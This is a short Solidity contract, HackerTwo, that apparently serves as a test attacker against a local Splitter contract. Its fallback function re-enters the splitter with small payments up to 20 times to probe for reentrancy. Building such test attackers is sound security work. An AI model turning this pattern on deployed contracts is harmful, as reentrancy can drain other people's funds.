pragma solidity ^0.4.10;

import "./Splitter.sol";

contract HackerTwo {
    
    event LogSplitterCreated(address splitter);

    address public splitter;
    uint i;

    constructor() public {
    }

    event LogStatus(uint hackerBalance, uint i);
    event LogPreStatus(uint hackerBalance, uint i);

    function() public payable {

        emit LogPreStatus(address(this).balance, i);
        if (i < 20) {
            i = i + 1;
            emit LogStatus(address(this).balance, i);
            splitter.call.value(1)();
        }

    }

    function addSplitter(address _splitter) public  {
        splitter = _splitter;
    }

    function getBalance() public constant returns (uint) {
        return address(this).balance;
    }
    
}
